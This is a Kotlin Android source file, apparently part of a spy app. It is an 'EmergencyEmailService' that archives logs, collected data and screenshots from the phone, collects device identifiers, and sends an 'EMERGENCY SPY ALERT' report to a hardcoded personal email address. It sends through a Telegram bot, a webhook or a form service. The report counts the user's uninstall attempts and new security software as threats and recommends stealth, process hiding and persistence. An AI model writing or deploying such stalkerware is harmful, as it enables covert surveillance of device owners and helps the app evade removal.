package com.example.spy_android.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import java.io.FileInputStream
import java.io.FileOutputStream

class EmergencyEmailService : Service() {

    companion object {
        private const val TAG = "EmergencyEmailService"
        private const val CHANNEL_ID = "EMERGENCY_EMAIL_CHANNEL"
        private const val NOTIFICATION_ID = 9999

        // 이메일 설정
        private const val TARGET_EMAIL = "tmdals7205@gmail.com"

        // 백업 전송 방법들
        private const val TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
        private const val TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
        private const val WEBHOOK_URL = "https://your-webhook-url.com/emergency"
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        Log.d(TAG, "긴급 이메일 서비스 생성됨")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val emergencyReason = intent?.getStringExtra("emergency_reason") ?: "Unknown emergency"

        startForegroundService()

        serviceScope.launch {
            performEmergencyDataTransmission(emergencyReason)
            stopSelf()
        }

        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        Log.d(TAG, "긴급 이메일 서비스 종료됨")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Emergency Data Transmission",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Critical security alerts and emergency data transmission"
                setShowBadge(false)
                setSound(null, null)
            }

            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun startForegroundService() {
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Security Alert")
            .setContentText("Transmitting critical security data...")
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setOngoing(true)
            .setAutoCancel(false)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private suspend fun performEmergencyDataTransmission(reason: String) {
        withContext(Dispatchers.IO) {
            try {
                Log.w(TAG, "긴급 데이터 전송 시작: $reason")

                // 1. 모든 데이터 수집 및 압축
                val zipFile = createDataArchive()

                // 2. 디바이스 정보 수집
                val deviceInfo = collectDeviceInfo()

                // 3. 긴급 보고서 생성
                val emergencyReport = createEmergencyReport(reason, deviceInfo)

                // 4. 다중 경로로 데이터 전송 시도
                var success = false

                // 방법 1: 텔레그램 봇 전송
                if (!success) {
                    success = sendViaTelegramBot(emergencyReport, zipFile)
                }

                // 방법 2: 웹훅 전송
                if (!success) {
                    success = sendViaWebhook(emergencyReport, zipFile)
                }

                // 방법 3: HTTP POST 직접 전송
                if (!success) {
                    success = sendViaHttpPost(emergencyReport)
                }

                // 5. 결과 로깅
                if (success) {
                    Log.i(TAG, "긴급 데이터 전송 성공")
                } else {
                    Log.e(TAG, "모든 긴급 전송 방법 실패")
                    // 로컬 백업 생성
                    createLocalBackup(emergencyReport, zipFile)
                }

            } catch (e: Exception) {
                Log.e(TAG, "긴급 데이터 전송 중 오류: ${e.message}")
            }
        }
    }

    private fun createDataArchive(): File? {
        return try {
            val tempDir = File(cacheDir, "emergency_temp")
            if (!tempDir.exists()) tempDir.mkdirs()

            val zipFile = File(tempDir, "emergency_data_${System.currentTimeMillis()}.zip")
            val zipOut = ZipOutputStream(FileOutputStream(zipFile))

            // 로그 파일들 압축
            addDirectoryToZip(zipOut, File(filesDir, "logs"), "logs/")

            // 수집된 데이터 압축
            addDirectoryToZip(zipOut, File(filesDir, "collected_data"), "collected_data/")

            // 스크린샷들 압축 (최근 10개만)
            addRecentScreenshots(zipOut, File(filesDir, "screenshots"))

            // 긴급 알림들 압축
            addDirectoryToZip(zipOut, File(filesDir, "emergency_alerts"), "emergency_alerts/")

            zipOut.close()

            Log.d(TAG, "데이터 아카이브 생성 완료: ${zipFile.absolutePath}")
            zipFile

        } catch (e: Exception) {
            Log.e(TAG, "데이터 아카이브 생성 실패: ${e.message}")
            null
        }
    }

    private fun addDirectoryToZip(zipOut: ZipOutputStream, dir: File, basePath: String) {
        if (!dir.exists()) return

        dir.listFiles()?.forEach { file ->
            if (file.isFile) {
                val entry = ZipEntry("$basePath${file.name}")
                zipOut.putNextEntry(entry)

                FileInputStream(file).use { input ->
                    input.copyTo(zipOut)
                }
                zipOut.closeEntry()
            } else if (file.isDirectory) {
                addDirectoryToZip(zipOut, file, "$basePath${file.name}/")
            }
        }
    }

    private fun addRecentScreenshots(zipOut: ZipOutputStream, screenshotDir: File) {
        if (!screenshotDir.exists()) return

        val screenshots = screenshotDir.listFiles()
            ?.filter { it.isFile && it.name.endsWith(".png") }
            ?.sortedByDescending { it.lastModified() }
            ?.take(10) // 최근 10개만

        screenshots?.forEach { file ->
            val entry = ZipEntry("screenshots/${file.name}")
            zipOut.putNextEntry(entry)
            FileInputStream(file).use { input ->
                input.copyTo(zipOut)
            }
            zipOut.closeEntry()
        }
    }

    private fun collectDeviceInfo(): Map<String, String> {
        return mapOf(
            "device_id" to (android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown") ,
            "model" to "${Build.MANUFACTURER} ${Build.MODEL}",
            "android_version" to Build.VERSION.RELEASE,
            "sdk_version" to Build.VERSION.SDK_INT.toString(),
            "app_version" to try {
                packageManager.getPackageInfo(packageName, 0).versionName
            } catch (e: Exception) {
                "Unknown"
            },
            "emergency_time" to Date().toString(),
            "timezone" to TimeZone.getDefault().id
        )
    }

    private fun createEmergencyReport(reason: String, deviceInfo: Map<String, String>): String {
        return """
🚨 EMERGENCY SPY ALERT 🚨

EMERGENCY REASON: $reason
ALERT TIME: ${Date()}

📱 DEVICE INFORMATION:
- Device ID: ${deviceInfo["device_id"]}
- Model: ${deviceInfo["model"]}
- Android: ${deviceInfo["android_version"]}
- App Version: ${deviceInfo["app_version"]}

⚠️ THREAT ANALYSIS:
${analyzeThreatLevel(reason)}

📊 DATA STATUS:
- Archive Size: ${getArchiveSize()}
- Last Collection: ${getLastCollectionTime()}
- Critical Events: ${getCriticalEventCount()}

🔧 RECOMMENDED ACTIONS:
${getRecommendedActions(reason)}

---
Emergency Report Generated: ${Date()}
Transmission Attempt: Multiple channels
Priority: CRITICAL
        """.trimIndent()
    }

    private fun analyzeThreatLevel(reason: String): String {
        return when {
            reason.contains("UNINSTALL", ignoreCase = true) -> "CRITICAL - App removal attempt detected"
            reason.contains("SECURITY_APP", ignoreCase = true) -> "HIGH - Security software installed"
            reason.contains("ADMIN_DISABLED", ignoreCase = true) -> "HIGH - Device admin privileges revoked"
            reason.contains("ROOT", ignoreCase = true) -> "MEDIUM - Root access detected"
            else -> "MEDIUM - Suspicious activity detected"
        }
    }

    private fun getArchiveSize(): String {
        return try {
            val tempDir = File(cacheDir, "emergency_temp")
            val zipFiles = tempDir.listFiles()?.filter { it.name.endsWith(".zip") }
            val totalSize = zipFiles?.sumOf { it.length() } ?: 0L
            "${totalSize / 1024} KB"
        } catch (e: Exception) {
            "Unknown"
        }
    }

    private fun getLastCollectionTime(): String {
        return try {
            val logsDir = File(filesDir, "logs")
            val lastModified = logsDir.listFiles()
                ?.maxOfOrNull { it.lastModified() } ?: 0L
            Date(lastModified).toString()
        } catch (e: Exception) {
            "Unknown"
        }
    }

    private fun getCriticalEventCount(): Int {
        return try {
            val alertsDir = File(filesDir, "emergency_alerts")
            alertsDir.listFiles()?.size ?: 0
        } catch (e: Exception) {
            0
        }
    }

    private fun getRecommendedActions(reason: String): String {
        return when {
            reason.contains("UNINSTALL") -> "1. Immediate data extraction\n2. Alternative persistence methods\n3. Remote wipe consideration"
            reason.contains("SECURITY_APP") -> "1. Stealth mode activation\n2. Process hiding\n3. Increased transmission frequency"
            else -> "1. Enhanced monitoring\n2. Backup data transmission\n3. Stealth protocols"
        }
    }

    private suspend fun sendViaTelegramBot(report: String, zipFile: File?): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val url = URL("https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage")
                val connection = url.openConnection() as HttpURLConnection

                connection.apply {
                    requestMethod = "POST"
                    setRequestProperty("Content-Type", "application/json")
                    doOutput = true
                }

                val jsonMessage = JSONObject().apply {
                    put("chat_id", TELEGRAM_CHAT_ID)
                    put("text", "🚨 EMERGENCY ALERT 🚨\n\n$report")
                    put("parse_mode", "HTML")
                }

                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(jsonMessage.toString())
                }

                val responseCode = connection.responseCode
                Log.d(TAG, "텔레그램 전송 응답 코드: $responseCode")

                responseCode == 200

            } catch (e: Exception) {
                Log.e(TAG, "텔레그램 전송 실패: ${e.message}")
                false
            }
        }
    }

    private suspend fun sendViaWebhook(report: String, zipFile: File?): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val url = URL(WEBHOOK_URL)
                val connection = url.openConnection() as HttpURLConnection

                connection.apply {
                    requestMethod = "POST"
                    setRequestProperty("Content-Type", "application/json")
                    doOutput = true
                }

                val jsonData = JSONObject().apply {
                    put("alert_type", "emergency")
                    put("target_email", TARGET_EMAIL)
                    put("report", report)
                    put("timestamp", System.currentTimeMillis())
                    put("device_id", android.provider.Settings.Secure.getString(
                        contentResolver,
                        android.provider.Settings.Secure.ANDROID_ID
                    ))
                }

                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(jsonData.toString())
                }

                val responseCode = connection.responseCode
                responseCode == 200

            } catch (e: Exception) {
                Log.e(TAG, "웹훅 전송 실패: ${e.message}")
                false
            }
        }
    }

    private suspend fun sendViaHttpPost(report: String): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                // Formspree나 다른 무료 폼 서비스 사용
                val url = URL("https://formspree.io/f/YOUR_FORM_ID")
                val connection = url.openConnection() as HttpURLConnection

                connection.apply {
                    requestMethod = "POST"
                    setRequestProperty("Content-Type", "application/json")
                    doOutput = true
                }

                val jsonData = JSONObject().apply {
                    put("email", TARGET_EMAIL)
                    put("subject", "🚨 EMERGENCY SPY ALERT")
                    put("message", report)
                }

                OutputStreamWriter(connection.outputStream).use { writer ->
                    writer.write(jsonData.toString())
                }

                val responseCode = connection.responseCode
                responseCode == 200

            } catch (e: Exception) {
                Log.e(TAG, "HTTP POST 전송 실패: ${e.message}")
                false
            }
        }
    }

    private fun createLocalBackup(report: String, zipFile: File?) {
        try {
            val backupDir = File(getExternalFilesDir(null), "emergency_backup")
            if (!backupDir.exists()) backupDir.mkdirs()

            // 보고서 저장
            val reportFile = File(backupDir, "emergency_report_${System.currentTimeMillis()}.txt")
            reportFile.writeText(report)

            // 아카이브 파일 복사
            zipFile?.let { zip ->
                if (zip.exists()) {
                    val backupZip = File(backupDir, "emergency_archive_${System.currentTimeMillis()}.zip")
                    zip.copyTo(backupZip)
                }
            }

            Log.i(TAG, "로컬 백업 생성 완료: ${backupDir.absolutePath}")

        } catch (e: Exception) {
            Log.e(TAG, "로컬 백업 생성 실패: ${e.message}")
        }
    }
}